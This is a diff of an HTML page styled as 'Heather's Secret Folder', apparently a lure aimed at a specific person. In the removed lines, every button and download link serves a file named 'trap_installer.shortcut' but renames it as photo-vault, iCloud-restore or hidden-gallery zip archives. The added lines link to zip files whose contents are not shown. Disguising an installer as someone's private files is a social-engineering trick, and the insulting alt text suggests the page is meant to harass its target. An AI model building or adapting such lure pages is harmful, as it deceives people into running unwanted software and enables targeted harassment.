@@ -22,22 +22,18 @@
       margin: 40px 0;
       flex-wrap: wrap;
     }
-    .trap-btn {
-      background-color: transparent;
-      border: none;
-      padding: 0;
-      cursor: pointer;
-    }
     .trap-img {
       width: 250px;
       border: 2px solid hotpink;
       border-radius: 10px;
+      cursor: pointer;
     }
     .link-grid {
       display: flex;
       justify-content: center;
-      gap: 40px;
+      gap: 30px;
       flex-wrap: wrap;
+      margin-top: 40px;
     }
     .download-button {
       background-color: black;
@@ -60,21 +56,21 @@
   <h1>💖 Heather’s Secret Folder 💖</h1>
 
   <div class="image-grid">
-    <button class="trap-btn" onclick="window.location.href='trap_installer.shortcut'">
-      <img class="trap-img" src="fuck.jpg" alt="vault" />
-    </button>
-    <button class="trap-btn" onclick="window.location.href='trap_installer.shortcut'">
-      <img class="trap-img" src="nothing.jpg" alt="messages" />
-    </button>
-    <button class="trap-btn" onclick="window.location.href='trap_installer.shortcut'">
-      <img class="trap-img" src="busted.gif" alt="apps" />
-    </button>
+    <a href="heathers_memories.zip" download>
+      <img class="trap-img" src="fuck.jpg" alt="fuck" />
+    </a>
+    <a href="icloud_restore.zip" download>
+      <img class="trap-img" src="nothing.jpg" alt="narcissist" />
+    </a>
+    <a href="hidden_gallery.zip" download>
+      <img class="trap-img" src="busted.gif" alt="busted" />
+    </a>
   </div>
 
   <div class="link-grid">
-    <a class="download-button" href="trap_installer.shortcut" download="heathers_memories.zip">📸 Download Vault Photos</a>
-    <a class="download-button" href="trap_installer.shortcut" download="icloud_restore.zip">📥 Restore iCloud Backup</a>
-    <a class="download-button" href="trap_installer.shortcut" download="hidden_gallery.zip">🔓 Unlock Hidden Gallery</a>
+    <a class="download-button" href="heathers_memories.zip" download>📸 Download Vault Photos</a>
+    <a class="download-button" href="icloud_restore.zip" download>📥 Restore iCloud Backup</a>
+    <a class="download-button" href="hidden_gallery.zip" download>🔓 Unlock Hidden Gallery</a>
   </div>
 </body>
 </html>
